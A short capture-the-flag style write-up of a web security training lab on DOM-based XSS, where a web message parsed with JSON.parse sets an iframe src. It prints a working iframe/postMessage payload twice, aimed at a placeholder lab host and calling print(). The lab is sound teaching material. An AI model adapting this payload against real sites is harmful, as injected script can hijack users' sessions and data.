# Lab: DOM XSS using web messages and JSON.parse (Practitioner)

**Goal:** Call `print()` by sending a crafted JSON web message.

## Vulnerability
Messages are parsed with `JSON.parse()`. For `type: "load-channel"` the `url` property is assigned to an iframe `src` with no sanitization.

## Solution

```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

### Steps
1. Find the listener and the `load-channel` case.
2. Post JSON that sets `url` to `javascript:print()`.
3. Deliver to the victim.

## Final Exploit Payload
```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
